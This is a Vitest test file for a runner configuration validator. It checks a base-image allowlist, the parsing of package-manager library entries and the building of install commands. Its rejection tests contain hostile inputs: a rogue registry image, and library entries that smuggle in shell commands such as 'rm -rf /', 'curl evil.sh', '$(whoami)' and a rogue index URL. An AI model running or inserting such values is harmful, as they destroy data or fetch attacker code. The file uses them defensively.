import { describe, expect, it } from 'vitest';
import {
  DEFAULT_BASE_IMAGE,
  MAX_LIBRARIES,
  RUNNER_BASE_IMAGES,
  resolveRunnerConfig,
  validateRunnerConfig,
} from './project-config';

/** Convenience: the issues of a result that is expected to have failed. */
function issues(result: ReturnType<typeof validateRunnerConfig>) {
  if (result.ok) throw new Error('expected the config to be rejected');
  return result.issues;
}

function config(result: ReturnType<typeof validateRunnerConfig>) {
  if (!result.ok) throw new Error(`expected the config to be accepted, got: ${result.issues.map((i) => i.message).join('; ')}`);
  return result.config;
}

describe('base image allowlist', () => {
  it('accepts every shipped image id', () => {
    for (const image of RUNNER_BASE_IMAGES) {
      expect(config(validateRunnerConfig({ baseImage: image.id, libraries: [] })).baseImage).toBe(image.id);
    }
  });

  it('rejects an image that is not on the allowlist, naming the ones that are', () => {
    const [issue] = issues(validateRunnerConfig({ baseImage: 'python-4.0', libraries: [] }));
    expect(issue.field).toBe('baseImage');
    expect(issue.message).toContain('python-4.0');
    expect(issue.message).toContain(DEFAULT_BASE_IMAGE);
  });

  // The whole point of the allowlist: a runner must never be told to pull an
  // arbitrary registry reference typed into the console.
  it('rejects a raw registry reference', () => {
    expect(issues(validateRunnerConfig({ baseImage: 'docker.io/attacker/evil:latest', libraries: [] }))).toHaveLength(1);
  });

  it('asks for a choice when the image is blank', () => {
    expect(issues(validateRunnerConfig({ baseImage: '  ', libraries: [] }))[0].message).toBe('Pick a base image');
  });
});

describe('library entries', () => {
  it('takes the image default manager for bare entries', () => {
    expect(config(validateRunnerConfig({ baseImage: 'python-3.12', libraries: ['pandas'] })).libraries).toEqual([
      { manager: 'pip', name: 'pandas', spec: 'pandas' },
    ]);
    expect(config(validateRunnerConfig({ baseImage: 'node-22', libraries: ['typescript'] })).libraries).toEqual([
      { manager: 'npm', name: 'typescript', spec: 'typescript' },
    ]);
  });

  it('accepts version specs, extras and scoped npm packages', () => {
    const c = config(
      validateRunnerConfig({
        baseImage: 'python-3.12',
        libraries: ['pandas==2.2.1', 'dbt-core[databricks]>=1.8', 'npm:@databricks/appkit@1.2.3', 'apt:jq=1.7-1'],
      }),
    );
    expect(c.libraries.map((l) => `${l.manager}/${l.name}`)).toEqual([
      'pip/pandas',
      'pip/dbt-core',
      'npm/@databricks/appkit',
      'apt/jq',
    ]);
  });

  it('drops blank lines rather than complaining about them', () => {
    expect(config(validateRunnerConfig({ baseImage: 'python-3.12', libraries: ['', '  ', 'pandas'] })).libraries).toHaveLength(1);
  });

  it('rejects an unknown manager prefix', () => {
    expect(issues(validateRunnerConfig({ baseImage: 'python-3.12', libraries: ['conda:numpy'] }))[0].message).toContain('conda');
  });

  it('rejects a manager the chosen image does not have', () => {
    const [issue] = issues(validateRunnerConfig({ baseImage: 'ubuntu-24.04', libraries: ['pip:pandas'] }));
    expect(issue.message).toContain('no pip');
  });

  it('rejects malformed package names', () => {
    const bad = ['-leading-dash', 'has space', 'pandas===2', 'pkg!!', 'npm:UPPERCASE'];
    for (const entry of bad) {
      expect(issues(validateRunnerConfig({ baseImage: 'python-3.12', libraries: [entry] }))).toHaveLength(1);
    }
  });

  // These strings become argv on a runner. Even without a shell in the path,
  // an entry carrying shell syntax is never a package name.
  it('rejects shell metacharacters and installer flags outright', () => {
    for (const entry of ['pandas; rm -rf /', 'pandas && curl evil.sh', '$(whoami)', '`id`', '--index-url=http://evil', 'a|b']) {
      const [issue] = issues(validateRunnerConfig({ baseImage: 'python-3.12', libraries: [entry] }));
      expect(issue.field).toBe('libraries');
    }
  });

  it('reports the row that failed so the UI can mark it inline', () => {
    const [issue] = issues(validateRunnerConfig({ baseImage: 'python-3.12', libraries: ['pandas', 'not a package', 'numpy'] }));
    expect(issue.index).toBe(1);
    expect(issue.value).toBe('not a package');
  });

  it('collects every problem in one pass instead of one per save', () => {
    expect(issues(validateRunnerConfig({ baseImage: 'python-3.12', libraries: ['bad one', 'worse two', 'conda:three'] }))).toHaveLength(3);
  });

  it('rejects duplicates, including pip name variants that resolve to the same package', () => {
    const [issue] = issues(validateRunnerConfig({ baseImage: 'python-3.12', libraries: ['dbt-core', 'dbt_core==1.8.0'] }));
    expect(issue.index).toBe(1);
    expect(issue.message).toContain('line 1');
  });

  it('allows the same name under two managers', () => {
    expect(config(validateRunnerConfig({ baseImage: 'python-3.12', libraries: ['requests', 'npm:requests'] })).libraries).toHaveLength(2);
  });

  it('caps the list length', () => {
    const many = Array.from({ length: MAX_LIBRARIES + 1 }, (_, i) => `pkg-${String(i)}`);
    const [issue] = issues(validateRunnerConfig({ baseImage: 'python-3.12', libraries: many }));
    expect(issue.field).toBe('libraries');
    expect(issue.message).toContain(String(MAX_LIBRARIES));
  });
});

describe('resolveRunnerConfig', () => {
  it('groups entries into one install command per manager', () => {
    const c = config(
      validateRunnerConfig({ baseImage: 'python-3.12', libraries: ['pandas', 'pyarrow==16.1.0', 'npm:typescript', 'apt:jq'] }),
    );
    const resolved = resolveRunnerConfig(c);
    expect(resolved.image).toBe('ghcr.io/datavail-solutions/runner-base:python-3.12');
    expect(resolved.installCommands.map((cmd) => cmd.manager)).toEqual(['pip', 'npm', 'apt']);
    expect(resolved.installCommands[0].argv.slice(-2)).toEqual(['pandas', 'pyarrow==16.1.0']);
    expect(resolved.installCommands[1].argv).toContain('typescript');
  });

  it('emits no install commands for an empty library list', () => {
    expect(resolveRunnerConfig({ baseImage: DEFAULT_BASE_IMAGE, libraries: [] }).installCommands).toEqual([]);
  });

  // A stored image id that was later retired must not break a claim.
  it('falls back to the default image when the stored id is gone', () => {
    expect(resolveRunnerConfig({ baseImage: 'retired-image', libraries: [] }).baseImage).toBe(DEFAULT_BASE_IMAGE);
  });
});
